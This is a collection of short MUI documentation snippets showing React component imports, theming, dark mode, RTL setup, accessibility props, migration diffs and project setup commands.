  const apiRef = useGridApiRef();

  return (
    <div>
      <Button onClick={() => apiRef.current.setPage(0)}>
        Go to page first page
      </Button>
      <DataGrid apiRef={apiRef} {...other} />
    </div>
  );
}

----------------------------------------

TITLE: Importing Base Components Display Module
DESCRIPTION: Renders a module that displays all available MUI Base components in alphabetical order. Uses a custom component from the modules/components directory.

LANGUAGE: javascript
CODE:
{"component": "modules/components/BaseUIComponents.js"}

----------------------------------------

TITLE: Configuring Dark Mode in Next.js Pages Router with Joy UI
DESCRIPTION: This code snippet shows how to set up dark mode in a Next.js project using the Pages Router. It demonstrates the use of InitColorSchemeScript in a custom _document.js file to prevent UI flickering on initial load.

LANGUAGE: jsx
CODE:
import Document, { Html, Head, Main, NextScript } from 'next/document';
import InitColorSchemeScript from '@mui/joy/InitColorSchemeScript';

export default class MyDocument extends Document {
  render() {
    return (
      <Html data-color-scheme="light">
        <Head>...</Head>
        <body>
          <InitColorSchemeScript />
          <Main />
          <NextScript />
        </body>
      </Html>
    );
  }
}

----------------------------------------

TITLE: Creating Multiline React Chips
DESCRIPTION: Demonstrates how to create multiline Chip components using custom styles.

LANGUAGE: JSX
CODE:
{"demo": "MultilineChips.js"}

----------------------------------------

TITLE: Manually Linking Input with Label for Accessibility
DESCRIPTION: Shows how to manually link an input with its label for improved accessibility.

LANGUAGE: jsx
CODE:
<label htmlFor="unique-id">Label</label>
<Input
  slotProps={{
    input: {
      id: 'unique-id',
    }
  }}
/>

----------------------------------------

TITLE: Importing Avatar Component in React
DESCRIPTION: Basic import statement for the Avatar component from Joy UI.

LANGUAGE: jsx
CODE:
import Avatar from '@mui/joy/Avatar';

----------------------------------------

TITLE: Importing Number Input Hook in React
DESCRIPTION: This snippet demonstrates how to import the useNumberInput hook from MUI Base.

LANGUAGE: js
CODE:
import { unstable_useNumberInput as useNumberInput } from '@mui/base/unstable_useNumberInput';

----------------------------------------

TITLE: FormControl TypeScript Usage with HTML Element
DESCRIPTION: Demonstrates TypeScript usage with primitive HTML elements.

LANGUAGE: tsx
CODE:
<FormControl<'button'> slots={{ root: 'button' }} onClick={() => {}} />

----------------------------------------

TITLE: Customizing MUI Base Switch Component with CSS Classes
DESCRIPTION: This example shows how to apply custom CSS classes to a MUI Base Switch component. It imports the switchClasses object to reference the component's default classes and applies custom styles to them.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { Switch, switchClasses } from '@mui/base/Switch';

export default function StylingCustomCss() {
  return (
    <div>
      <Switch
        slotProps={{
          root: { className: 'CustomSwitch' },
        }}
      />
      <Switch defaultChecked />
      <Switch disabled />
      <style>{`
        .CustomSwitch {
          font-size: 0;
          position: relative;
          display: inline-block;
          width: 32px;
          height: 20px;
          cursor: pointer;
          background: #B3C3D3;
          border-radius: 9999px;
          margin: 10px;
          transition: all 150ms;
        }

        .CustomSwitch .${switchClasses.thumb} {
          display: block;
          width: 14px;
          height: 14px;
          top: 3px;
          left: 3px;
          border-radius: 16px;
          background-color: #FFF;
          position: relative;
          transition: all 200ms;
        }

        .CustomSwitch .${switchClasses.input} {
          cursor: inherit;
          position: absolute;
          width: 100%;
          height: 100%;
          top: 0;
          left: 0;
          opacity: 0;
          z-index: 1;
          margin: 0;
        }

        .CustomSwitch:hover {
          background: #8796A5;
        }

        .CustomSwitch.${switchClasses.disabled} {
          opacity: 0.4;
          cursor: not-allowed;
        }

        .CustomSwitch.${switchClasses.checked} {
          background: #007FFF;
        }

        .CustomSwitch.${switchClasses.checked} .${switchClasses.thumb} {
          left: 14px;
          top: 3px;
          background-color: #FFF;
        }

        .CustomSwitch.${switchClasses.checked}:hover {
          background: #0059B2;
        }
      `}</style>
    </div>
  );
}

----------------------------------------

TITLE: Importing React Accordion Components
DESCRIPTION: Basic imports needed to use the Material-UI Accordion components in a React application.

LANGUAGE: jsx
CODE:
import Accordion from '@mui/material/Accordion';
import AccordionDetails from '@mui/material/AccordionDetails';
import AccordionSummary from '@mui/material/AccordionSummary';

----------------------------------------

TITLE: Running Material UI Next.js Project
DESCRIPTION: Commands to install dependencies and start the development server for the Material UI Next.js project.

LANGUAGE: bash
CODE:
npm install
npm run dev

----------------------------------------

TITLE: Applying Mode-Specific Styles in Material UI v6
DESCRIPTION: Demonstrates the new theme.applyStyles() method for creating mode-specific styles in Material UI v6.

LANGUAGE: jsx
CODE:
const StyledInput = styled(InputBase)(({ theme }) => ({
  padding: 10,
  width: '100%',
  borderBottom: '1px solid #eaecef',
  ...theme.applyStyles('dark', {
    borderBottom: '1px solid #30363d',
  }),
  '& input': {
    borderRadius: 4,
    backgroundColor: '#fff',
    ...theme.applyStyles('dark', {
      backgroundColor: '#0d1117',
    }),
  },
}));

----------------------------------------

TITLE: Plain CSS Styling for Material UI Slider
DESCRIPTION: Example of styling Material UI Slider component using plain CSS with custom classes and hover states

LANGUAGE: CSS
CODE:
.slider {
  color: #20b2aa;
}

.slider:hover {
  color: #2e8b57;
}

LANGUAGE: JSX
CODE:
import * as React from 'react';
import Slider from '@mui/material/Slider';
import './PlainCssSlider.css';

export default function PlainCssSlider() {
  return (
    <div>
      <Slider defaultValue={30} />
      <Slider defaultValue={30} className="slider" />
    </div>
  );
}

----------------------------------------

TITLE: Basic Slider Implementation in React Joy UI
DESCRIPTION: Basic setup and usage of the Slider component. Shows how to import and implement a simple slider with default value and maximum setting.

LANGUAGE: jsx
CODE:
import Slider from '@mui/joy/Slider';

export default function MyApp() {
  return <Slider defaultValue={3} max={10} />;
}

----------------------------------------

TITLE: Detecting System Color Scheme in Joy UI
DESCRIPTION: This code snippet shows how to use the useColorScheme hook to identify the user's system color scheme preference. It logs both the current mode and the system mode to the console.

LANGUAGE: javascript
CODE:
import { useColorScheme } from '@mui/joy/styles';

function SomeComponent() {
  const { mode, systemMode } = useColorScheme();
  console.log(mode); // "system"
  console.log(systemMode); // "light" | "dark" based on the user's preference.
}

----------------------------------------

TITLE: Configuring Material UI Theme for RTL
DESCRIPTION: Creates a Material UI theme with RTL direction using createTheme API

LANGUAGE: javascript
CODE:
import { createTheme } from '@mui/material/styles';

const theme = createTheme({
  direction: 'rtl',
});

----------------------------------------

TITLE: Customizing Input Focus Ring with CSS Variables
DESCRIPTION: Demonstrates how to customize the appearance of the input's focus ring using CSS variables in the sx prop.

LANGUAGE: jsx
CODE:
<Input sx={{ '&:focus-within::before': { boxShadow: '...your custom value' } }} />

----------------------------------------

TITLE: Implementing a Custom Select Component with TypeScript and forwardRef
DESCRIPTION: Example of creating a custom Select component using TypeScript and React's forwardRef to handle generic props correctly.

LANGUAGE: tsx
CODE:
const CustomSelect = React.forwardRef(function CustomSelect<TValue>(
  props: SelectProps<TValue>,
  ref: React.ForwardedRef<HTMLUListElement>,
) {
  // ...your code here...
  return <Select {...props} ref={ref} />;
}) as <TValue>(
  props: SelectProps<TValue> & React.RefAttributes<HTMLUListElement>,
) => React.JSX.Element;

----------------------------------------

TITLE: MUI Font Size Control
DESCRIPTION: Examples of setting font size using the Box component, including theme references and direct values.

LANGUAGE: jsx
CODE:
<Box sx={{ fontSize: 'default' }}>…  // theme.typography.fontSize
<Box sx={{ fontSize: 'h6.fontSize' }}>…
<Box sx={{ fontSize: 16 }}>…

----------------------------------------

TITLE: TypeScript Usage with Custom Component
DESCRIPTION: Shows how to use the Badge component with TypeScript and custom components.

LANGUAGE: tsx
CODE:
<Badge<typeof CustomComponent> slots={{ root: CustomComponent }} customProp />

LANGUAGE: tsx
CODE:
<Badge<'img'> slots={{ root: 'img' }} src="badge.png" />

----------------------------------------

TITLE: Adding Avatar to React Chips
DESCRIPTION: Shows how to add an avatar to Chip components using the avatar prop.

LANGUAGE: JSX
CODE:
{"demo": "AvatarChips.js"}

----------------------------------------

TITLE: Installing Material UI Next.js Project
DESCRIPTION: Commands to download and set up a Material UI project with Next.js Pages Router and TypeScript from the official repository.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-nextjs-pages-router-ts
cd material-ui-nextjs-pages-router-ts

----------------------------------------

TITLE: Performance Optimization with GlobalStyles
DESCRIPTION: Configuration for optimizing TextField performance by disabling global style injection and manually adding required keyframe animations.

LANGUAGE: jsx
CODE:
import { GlobalStyles, createTheme, ThemeProvider } from '@mui/material';

const theme = createTheme({
  components: {
    MuiInputBase: {
      defaultProps: {
        disableInjectingGlobalStyles: true,
      },
    },
  },
});

export default function App() {
  return (
    <ThemeProvider theme={theme}>
      <GlobalStyles
        styles={{
          '@keyframes mui-auto-fill': { from: { display: 'block' } },
          '@keyframes mui-auto-fill-cancel': { from: { display: 'block' } },
        }}
      />
      ...
    </ThemeProvider>
  );
}

----------------------------------------

TITLE: Demonstrating Class Name Prefix Caveat
DESCRIPTION: Shows how Joy UI and Material UI components share class name prefixes, which can lead to unexpected styling behaviors when using class-based selectors.

LANGUAGE: javascript
CODE:
import MaterialTypography, {
  typographyClasses as materialTypographyClasses,
} from '@mui/material/Typography';
import JoyTypography, {
  typographyClasses as joyTyographyClasses,
} from '@mui/joy/Typography';
import Stack from '@mui/material/Stack';

<Stack
  sx={{
    [`& .${materialTypographyClasses.root}`]: {
      color: 'red',
    },
  }}
>
  <MaterialTypography>Red</MaterialTypography>
  <JoyTypography>Red</JoyTypography>
</Stack>;

----------------------------------------

TITLE: Downloading and Extracting MUI Base Example with Bash
DESCRIPTION: This snippet shows how to download the MUI Base example from the Material-UI repository and extract it to a local directory using curl and tar commands.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/base-ui-cra
cd base-ui-cra

----------------------------------------

TITLE: TypeScript Usage with Custom Component
DESCRIPTION: Demonstrates TypeScript usage with custom component types and props

LANGUAGE: tsx
CODE:
<Button<typeof CustomComponent> slots={{ root: CustomComponent }} customProp />

LANGUAGE: tsx
CODE:
<Button<'img'> slots={{ root: 'img' }} src="button.png" />

----------------------------------------

TITLE: Importing Material UI Component Modules in JavaScript
DESCRIPTION: These code snippets demonstrate the importing of various Material UI component modules. Each module corresponds to a specific category of components, such as inputs, data display, feedback, etc.

LANGUAGE: JavaScript
CODE:
{{"component": "modules/components/MaterialUIComponents/MaterialInputComponents.js"}}

LANGUAGE: JavaScript
CODE:
{{"component": "modules/components/MaterialUIComponents/MaterialDataDisplayComponents.js"}}

LANGUAGE: JavaScript
CODE:
{{"component": "modules/components/MaterialUIComponents/MaterialFeedbackComponents.js"}}

LANGUAGE: JavaScript
CODE:
{{"component": "modules/components/MaterialUIComponents/MaterialSurfaceComponents.js"}}

LANGUAGE: JavaScript
CODE:
{{"component": "modules/components/MaterialUIComponents/MaterialNavigationComponents.js"}}

LANGUAGE: JavaScript
CODE:
{{"component": "modules/components/MaterialUIComponents/MaterialLayoutComponents.js"}}

LANGUAGE: JavaScript
CODE:
{{"component": "modules/components/MaterialUIComponents/MaterialLabComponents.js"}}

LANGUAGE: JavaScript
CODE:
{{"component": "modules/components/MaterialUIComponents/MaterialUtilComponents.js"}}

----------------------------------------

TITLE: Installing Dependencies and Running the Next.js Development Server
DESCRIPTION: These bash commands install the project dependencies using npm and start the Next.js development server.

LANGUAGE: bash
CODE:
npm install
npm run dev

----------------------------------------

TITLE: Importing Paper Component in React
DESCRIPTION: This snippet shows how to import the Paper component from Material-UI in a React application.

LANGUAGE: jsx
CODE:
import Paper from '@mui/material/Paper';

----------------------------------------

TITLE: Browser Support Table in Markdown
DESCRIPTION: A markdown table showing minimum version requirements for different browsers that are supported by Material UI.

LANGUAGE: markdown
CODE:
| Edge   | Firefox | Chrome | Safari (macOS) | Safari (iOS) |
| :----- | :------ | :----- | :------------- | :----------- |
| >= 121 | >= 115  | >= 109 | >= 15.4        | >= 15.4      |

----------------------------------------

TITLE: Replacing innerRef with ref
DESCRIPTION: Replace innerRef prop with ref prop for automatic ref forwarding.

LANGUAGE: diff
CODE:
  import * as React from 'react';
  import { withStyles } from '@mui/styles';

  const MyComponent = withStyles({
    root: {
      backgroundColor: 'red',
    },
  })(({ classes }) => <div className={classes.root} />);

  function MyOtherComponent(props) {
    const ref = React.useRef();
-  return <MyComponent innerRef={ref} />;
+  return <MyComponent ref={ref} />;
  }

----------------------------------------

TITLE: Using renderInput Prop for Date and Time Pickers in React
DESCRIPTION: Demonstrates how to use the new required renderInput prop for DatePicker and TimePicker components.

LANGUAGE: jsx
CODE:
<DatePicker renderInput={(props) => <TextField {...props} />} />
<TimePicker renderInput={(props) => <TextField {...props} />} />

----------------------------------------

TITLE: Implementing Ellipsis Content in List Items
DESCRIPTION: Import statement for ListItemContent component used in combination with Typography for text overflow handling.

LANGUAGE: jsx
CODE:
import ListItemContent from '@mui/joy/ListItemContent';

----------------------------------------

TITLE: Configuring Popup Placement in React
DESCRIPTION: Shows how to change the placement of the Popup using the 'placement' prop. This example suggests changing the value to 'top' to demonstrate the effect.

LANGUAGE: jsx
CODE:
{"demo": "Placement.js", "defaultCodeOpen": false }

----------------------------------------

TITLE: Accessibility Configuration for Divider
DESCRIPTION: Example of configuring the Divider component for better accessibility by hiding it from screen readers.

LANGUAGE: js
CODE:
<Divider aria-hidden="true" />

----------------------------------------

TITLE: Fixing DOM Node Errors in React Components with Material UI v5
DESCRIPTION: These code snippets demonstrate how to properly use Material UI v5 transition components like Fade with React components, ensuring that refs are correctly forwarded to DOM nodes.

LANGUAGE: jsx
CODE:
// Ex. 1-2 ✅ Add a DOM node such as this div:
<Fade in>
  <div>
    <CustomComponent />
  </div>
</Fade>

LANGUAGE: jsx
CODE:
// Ex. 2-2 ✅ Add `React.forwardRef` to forward `ref` to the DOM:
const CustomComponent = React.forwardRef(function CustomComponent(props, ref) {
  return (
    <div ref={ref}>
      ...
    </div>
  )
})

<Fade in>
  <CustomComponent />
</Fade>

----------------------------------------

TITLE: Setting Maximum Height for TextareaAutosize
DESCRIPTION: Example demonstrating how to limit the maximum height of the TextareaAutosize component using the maxRows prop.

LANGUAGE: jsx
CODE:
{"demo": "MaxHeightTextarea.js"}

----------------------------------------

TITLE: Custom Column Count in Grid
DESCRIPTION: Demonstrates how to change the default number of columns (12) in a grid layout using the columns prop.

LANGUAGE: JavaScript
CODE:
{"demo": "ColumnsGrid.js", "bg": true}

----------------------------------------

TITLE: Responsive Grid Values
DESCRIPTION: Shows how to implement a responsive layout grid by switching prop values based on active breakpoints, following Material Design recommendations.

LANGUAGE: JavaScript
CODE:
{"demo": "ResponsiveGrid.js", "bg": true}

----------------------------------------

TITLE: Accessible Modal Implementation
DESCRIPTION: Example of implementing an accessible modal with proper ARIA attributes for labels and descriptions.

LANGUAGE: jsx
CODE:
<Modal aria-labelledby="modal-title" aria-describedby="modal-description">
  <h2 id="modal-title">My Title</h2>
  <p id="modal-description">My Description</p>
</Modal>

----------------------------------------

TITLE: Box Component Height Examples
DESCRIPTION: Examples showing different percentage-based height values using the Box component.

LANGUAGE: jsx
CODE:
<Box sx={{ height: '25%' }}>…
<Box sx={{ height: '50%' }}>…
<Box sx={{ height: '75%' }}>…
<Box sx={{ height: '100%' }}>…

----------------------------------------

TITLE: Configuring Default Robot Access Rules
DESCRIPTION: Sets default access rules for web crawlers using standard robots.txt syntax. Allows unrestricted access to all user agents by using an empty Disallow directive.

LANGUAGE: robotstxt
CODE:
# https://www.robotstxt.org/robotstxt.html
User-agent: *
Disallow:

----------------------------------------

TITLE: Basic HTML Structure of Snackbar Component
DESCRIPTION: Illustrates the basic HTML structure of the Snackbar component, which consists of a single root div element.

LANGUAGE: html
CODE:
<div role="presentation" className="BaseSnackbar-root">snackbar content</div>

----------------------------------------

TITLE: Extending MUI Theme with Custom Colors in React
DESCRIPTION: This snippet demonstrates how to extend the MUI theme with custom colors and use them in components. It includes steps to extend the theme, notify TypeScript about the new color, and use the custom color in a Button component.

LANGUAGE: jsx
CODE:
import { createMuiTheme, Button } from '@mui/material';

// 1. Extend the theme.
const theme = createMuiTheme({
  palette: {
    neutral: {
      main: '#5c6ac4',
    },
  },
});

// 2. Notify TypeScript about the new color in the palette
declare module '@mui/material/styles' {
  interface Palette {
    neutral: Palette['primary'];
  }
  interface PaletteOptions {
    neutral: PaletteOptions['primary'];
  }
}

// 3. Profit
<Button color="neutral"  />

----------------------------------------

TITLE: Downloading and Extracting Material UI CRA Tailwind TypeScript Example
DESCRIPTION: This bash command downloads the Material UI example project for CRA with Tailwind CSS in TypeScript, extracts it, and changes to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-cra-tailwind-ts
cd material-ui-cra-tailwind-ts

----------------------------------------

TITLE: Importing position utilities from MUI System in JavaScript
DESCRIPTION: Shows how to import the positions utility from the @mui/system package. This import provides access to various position-related props and CSS properties.

LANGUAGE: js
CODE:
import { positions } from '@mui/system';

----------------------------------------

TITLE: Using Aspect Ratio with Next.js Image Component
DESCRIPTION: This example demonstrates how to use the AspectRatio component with Next.js Image component. It requires setting the layout prop of the Image component to 'fill' for proper integration.

LANGUAGE: jsx
CODE:
import Image from 'next/image';
import AspectRatio from '@mui/joy/AspectRatio';
import mountains from '../public/mountains.jpg';

function App() {
  return (
    <AspectRatio variant="outlined" ratio="1" objectFit="cover">
      {/* only layout="fill" makes sense for using with AspectRatio */}
      <Image alt="Mountains" src={mountains} layout="fill" placeholder="blur" />
    </AspectRatio>
  );
}

----------------------------------------

TITLE: Button Component Customization with Server Components
DESCRIPTION: Example demonstrating proper and improper ways to customize MUI Base Button components when working with Server Components in Next.js.

LANGUAGE: typescript
CODE:
export default function Page() {
  return (
    <React.Fragment>
      {/* Next.js won't render this button without 'use-client'*/}
      <Button
        slotProps={{
          root: (ownerState: ButtonOwnerState) => ({
            className: ownerState.disabled ? 'bg-gray-400' : 'bg-blue-400',
          }),
        }}
      >
        Submit
      </Button>

      {/* Next.js can render this */}
      <Button
        slotProps={{
          root: {
            className: 'bg-gray-400',
          },
        }}
      >
        Return
      </Button>
    </React.Fragment>
  );
}

----------------------------------------

TITLE: Divider with Custom Component and Role
DESCRIPTION: Example of using Divider as a presentation wrapper with Typography component, configured for proper accessibility.

LANGUAGE: js
CODE:
<Divider component="div" role="presentation">
  <Typography>Text element</Typography>
</Divider>

----------------------------------------

TITLE: Nesting Selectors with makeStyles in React
DESCRIPTION: Shows how to nest selectors within makeStyles to target nested elements in a component.

LANGUAGE: js
CODE:
const useStyles = makeStyles({
  root: {
    color: 'red',
    '& p': {
      color: 'green',
      '& span': {
        color: 'blue',
      },
    },
  },
});

----------------------------------------

TITLE: Basic Media Query Hook Usage in React
DESCRIPTION: Basic example showing how to use the useMediaQuery hook with a simple CSS media query.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import useMediaQuery from '@mui/material/useMediaQuery';

export default function SimpleMediaQuery() {
  const matches = useMediaQuery('(min-width:600px)');

  return <span>{`(min-width:600px) matches: ${matches}`}</span>;
}

----------------------------------------

TITLE: Vertical ButtonGroup Orientation
DESCRIPTION: Demonstrates vertical orientation of button groups using the orientation prop

LANGUAGE: jsx
CODE:
<ButtonGroup orientation="vertical">\n  <Button>Button 1</Button>\n  <Button>Button 2</Button>\n</ButtonGroup>

----------------------------------------

TITLE: AppBar Dark Mode Color Prop
DESCRIPTION: Setting enableColorOnDark prop to restore v4 color behavior in dark mode

LANGUAGE: jsx
CODE:
<AppBar enableColorOnDark />

----------------------------------------

TITLE: Installing Marketing Page Template for MUI Projects
DESCRIPTION: Steps to incorporate the marketing page template into a MUI project. This includes copying necessary folders, ensuring required dependencies are installed, and importing the MarketingPage component.

LANGUAGE: markdown
CODE:
1. Copy these folders (`marketing-page` and `shared-theme`) into your project, or one of the [example projects](https://github.com/mui/material-ui/tree/master/examples).
2. Make sure your project has the required dependencies: @mui/material, @mui/icons-material, @emotion/styled, @emotion/react.
3. Import and use the `MarketingPage` component.

----------------------------------------

TITLE: Adding Accessible Labels to Input Components in React
DESCRIPTION: Shows different ways to add accessible labels to form control components like Input, Number Input, and Select. This includes using associated label elements and aria-label attributes.

LANGUAGE: jsx
CODE:
<label>
  First name <Input />
</label>

LANGUAGE: jsx
CODE:
<label for="first-name">First name</label>
<Input id="first-name" />

LANGUAGE: jsx
CODE:
<Input aria-label="First name" />

----------------------------------------

TITLE: Updating Box Import in JavaScript/TypeScript
DESCRIPTION: This code snippet demonstrates the change in importing the Box component from Material-UI, reflecting its transition from an unstable to a stable API.

LANGUAGE: JavaScript
CODE:
-import { unstable_Box as Box } from '@material-ui/core/Box';
+import Box from '@material-ui/core/Box';

----------------------------------------

TITLE: Downloading and Setting Up the Material UI and Next.js Example Project
DESCRIPTION: These bash commands download the example project from the Material UI repository, extract it, and navigate to the project directory.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-nextjs-ts-v4-v5-migration
cd material-ui-nextjs-ts-v4-v5-migration

----------------------------------------

TITLE: Setting HTML Direction via JavaScript
DESCRIPTION: Alternative method to set RTL direction using JavaScript DOM API

LANGUAGE: javascript
CODE:
document.documentElement.setAttribute('dir', 'rtl');

----------------------------------------

TITLE: Keeping old ChipDelete default props
DESCRIPTION: Code to maintain the previous default variant and color for the ChipDelete component.

LANGUAGE: javascript
CODE:
extendTheme({
  components: {
    JoyChipDelete: {
      defaultProps: {
        variant: 'solid',
        color: 'primary',
      },
    },
  },
});

----------------------------------------

TITLE: Controlling Visibility with MUI Box Component in JSX
DESCRIPTION: Demonstrates how to control element visibility using MUI Box component, showing both visible and hidden containers.

LANGUAGE: jsx
CODE:
<Box component="div" sx={{ visibility: 'visible' }}>
  Visible container
</Box>
<Box component="div" sx={{ visibility: 'hidden' }}>
  Invisible container
</Box>

----------------------------------------

TITLE: Starting Next.js Development Server
DESCRIPTION: Command to start the Next.js development server for the Pigment CSS demo application.

LANGUAGE: bash
CODE:
pnpm run --filter=@app/pigment-css-next-app dev

----------------------------------------

TITLE: Direct Props vs SlotProps Usage in React
DESCRIPTION: Demonstrates equivalent ways of passing props to the root slot - directly on the component or through slotProps.root.

LANGUAGE: jsx
CODE:
<Badge id="badge1">

LANGUAGE: jsx
CODE:
<Badge slotProps={{ root: { id: 'badge1' } }}>

----------------------------------------

TITLE: Custom Picker Layout Implementation in TSX
DESCRIPTION: Demonstrates how to create a custom layout for date pickers using the new layout customization features in v6.

LANGUAGE: tsx
CODE:
function MyCustomLayout(props) {
  const { toolbar, tabs, content, actionBar } = usePickerLayout(props);

  return (
    <PickersLayoutRoot className={pickersLayout.root} ownerState={props}>
      {toolbar}
      {actionBar}
      <PickersLayoutContentWrapper className={pickersLayout.contentWrapper}>
        {tabs}
        {content}
      </PickersLayoutContentWrapper>
    </PickersLayoutRoot>
  );
}

export default function CustomStaticDatePicker() {
  return <StaticDatePicker slots={{ layout: MyCustomLayout }} />;
}

----------------------------------------

TITLE: Installing Dependencies and Running the MUI Base Vite.js Example
DESCRIPTION: These commands install the project dependencies using npm and start the development server.

LANGUAGE: bash
CODE:
npm install
npm start

----------------------------------------

TITLE: Create React App Config Override
DESCRIPTION: Configuration for using babel-plugin-import with Create React App without ejecting.

LANGUAGE: javascript
CODE:
/* config-overrides.js */
/* eslint-disable react-hooks/rules-of-hooks */
const { useBabelRc, override } = require('customize-cra');

module.exports = override(useBabelRc());

----------------------------------------

TITLE: Importing Box Component in React
DESCRIPTION: Basic import statement for the Box component from Joy UI package.

LANGUAGE: jsx
CODE:
import Box from '@mui/joy/Box';

----------------------------------------

TITLE: Divider HTML Structure
DESCRIPTION: Basic HTML structure showing how the Divider component is rendered in the DOM.

LANGUAGE: html
CODE:
<hr class="MuiDivider-root">
  <!-- Divider children goes here -->
</hr>

----------------------------------------

TITLE: Delayed Client-Side Rendering with No-SSR in React
DESCRIPTION: This example shows how to use the 'defer' prop of the No-SSR component to delay rendering of complex components on the client side, allowing the rest of the application to load first.

LANGUAGE: jsx
CODE:
{"demo": "FrameDeferring.js"}

----------------------------------------

TITLE: Testing Setup for Media Queries
DESCRIPTION: Implementation of matchMedia polyfill for testing environments using css-mediaquery.

LANGUAGE: js
CODE:
import mediaQuery from 'css-mediaquery';

function createMatchMedia(width) {
  return (query) => ({
    matches: mediaQuery.match(query, {
      width,
    }),
    addEventListener: () => {},
    removeEventListener: () => {},
  });
}

describe('MyTests', () => {
  beforeAll(() => {
    window.matchMedia = createMatchMedia(window.innerWidth);
  });
});

----------------------------------------

TITLE: Configuring styled-components with RTL Support
DESCRIPTION: Setting up styled-components' StyleSheetManager with RTL plugin for right-to-left styling support.

LANGUAGE: jsx
CODE:
import { StyleSheetManager } from 'styled-components';
import rtlPlugin from 'stylis-plugin-rtl';

function Rtl(props) {
  return (
    <StyleSheetManager stylisPlugins={[rtlPlugin]}>
      {props.children}
    </StyleSheetManager>
  );
}

----------------------------------------

TITLE: Rendering Demo Container with Hidden Toolbar in MUI Docs
DESCRIPTION: Illustrates how to hide the toolbar in a demo container for MUI documentation.

LANGUAGE: markdown
CODE:
{"demo": "DemoInDocsNotEditable.js", "hideToolbar": true}

----------------------------------------

TITLE: Creating a Basic Popup in React
DESCRIPTION: Demonstrates how to create and style a basic Popup component. The code shows the structure of a simple Popup with a toggle button.

LANGUAGE: jsx
CODE:
{"demo": "SimplePopup.js", "defaultCodeOpen": true}

----------------------------------------

TITLE: Importing Stack Component in React
DESCRIPTION: Basic import statement for the Stack component from Joy UI library.

LANGUAGE: jsx
CODE:
import Stack from '@mui/joy/Stack'

----------------------------------------

TITLE: Building Workspace Packages
DESCRIPTION: Command to build all packages in the workspace before starting the application.

LANGUAGE: bash
CODE:
pnpm build

----------------------------------------

TITLE: Custom Heading Level Accordion Example
DESCRIPTION: Example showing how to customize the heading level of an Accordion component using the slotProps prop.

LANGUAGE: jsx
CODE:
<Accordion slotProps={{ heading: { component: 'h4' } }}>
  <AccordionSummary
    expandIcon={<ExpandMoreIcon />}
    aria-controls="panel1-content"
    id="panel1-header"
  >
    Accordion
  </AccordionSummary>
  <AccordionDetails>
    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Suspendisse malesuada
    lacus ex, sit amet blandit leo lobortis eget.
  </AccordionDetails>
</Accordion>

----------------------------------------

TITLE: Rendering Standard Demo Container in MUI Docs
DESCRIPTION: Demonstrates how to render a standard demo container in MUI documentation. The standard variant uses an outlined background by default.

LANGUAGE: markdown
CODE:
{"demo": "DemoInDocs.js"}

----------------------------------------

TITLE: Running deprecations codemod for Material UI v5
DESCRIPTION: Command to run the Material UI codemod that automatically migrates deprecated APIs

LANGUAGE: bash
CODE:
npx @mui/codemod@latest deprecations/all <path>

----------------------------------------

TITLE: Implementing Typography Components
DESCRIPTION: Implementation of Typography components for heading and body text with different hierarchy levels.

LANGUAGE: jsx
CODE:
<div>
  <Typography level="h4" component="h1">
    Welcome!
  </Typography>
  <Typography level="body-sm">Sign in to continue.</Typography>
</div>

----------------------------------------

TITLE: Configuring Material UI in Next.js Pages Router _document.tsx
DESCRIPTION: Shows how to configure Material UI in the _document.tsx file for Next.js Pages Router.

LANGUAGE: typescript
CODE:
import {
  DocumentHeadTags,
  documentGetInitialProps,
} from '@mui/material-nextjs/v15-pagesRouter';

export default function MyDocument(props) {
  return (
    <Html lang="en">
      <Head>
        <DocumentHeadTags {...props} />
      </Head>
      <body>
        <Main />
        <NextScript />
      </body>
    </Html>
  );
}

MyDocument.getInitialProps = async (ctx) => {
  const finalProps = await documentGetInitialProps(ctx);
  return finalProps;
};

----------------------------------------

TITLE: MUI System Flexbox API Import
DESCRIPTION: Shows how to import flexbox utilities from MUI System package and lists available properties.

LANGUAGE: js
CODE:
import { flexbox } from '@mui/system';

----------------------------------------

TITLE: Customizing Divider Child Position
DESCRIPTION: Example demonstrating how to control the position of divider content using CSS variables through the sx prop.

LANGUAGE: js
CODE:
<Divider sx={{ '--Divider-childPosition': '20%' }}> {/* the value can be any CSS valid unit */}

----------------------------------------

TITLE: Grid Spacing Configuration
DESCRIPTION: Shows how to control the spacing between grid items using the spacing prop. The spacing value can be any positive number or string and is converted using the theme.spacing() helper.

LANGUAGE: JavaScript
CODE:
{"demo": "SpacingGrid.js", "bg": true, "hideToolbar": true}

----------------------------------------

TITLE: Creating Autocomplete Options Array in JavaScript
DESCRIPTION: This example demonstrates how to create an array of options for the Autocomplete component, using both object and string formats.

LANGUAGE: javascript
CODE:
const options = [
  { label: 'The Godfather', id: 1 },
  { label: 'Pulp Fiction', id: 2 },
];
// or
const options = ['The Godfather', 'Pulp Fiction'];

----------------------------------------

TITLE: Importing FormControl Component in React
DESCRIPTION: Basic import statement for the FormControl component from MUI Base.

LANGUAGE: jsx
CODE:
import { FormControl } from '@mui/base/FormControl';

----------------------------------------

TITLE: Installing RTL Plugin Dependencies
DESCRIPTION: Package installation commands for RTL styling support using different package managers.

LANGUAGE: bash
CODE:
npm install stylis stylis-plugin-rtl

LANGUAGE: bash
CODE:
pnpm add stylis stylis-plugin-rtl

LANGUAGE: bash
CODE:
yarn add stylis stylis-plugin-rtl

----------------------------------------

TITLE: Theme Customization with Generated Classes
DESCRIPTION: Example of properly using component classes for theming with ClassNameGenerator.

LANGUAGE: javascript
CODE:
import { outlinedInputClasses } from '@mui/material/OutlinedInput';

const theme = createTheme({
  components: {
    MuiOutlinedInput: {
      styleOverrides: {
        root: {
          [`& .${outlinedInputClasses.notchedOutline}`]: {
            borderWidth: 1,
          }
        }
      }
    }
  }
});

----------------------------------------

TITLE: Rendering Demo Container with Hidden Toolbar and Inline Background in MUI Docs
DESCRIPTION: Shows how to hide the toolbar and set an inline background for a demo container in MUI documentation.

LANGUAGE: markdown
CODE:
{"demo": "DemoInDocsNotEditable.js", "hideToolbar": true, "bg": "inline"}

----------------------------------------

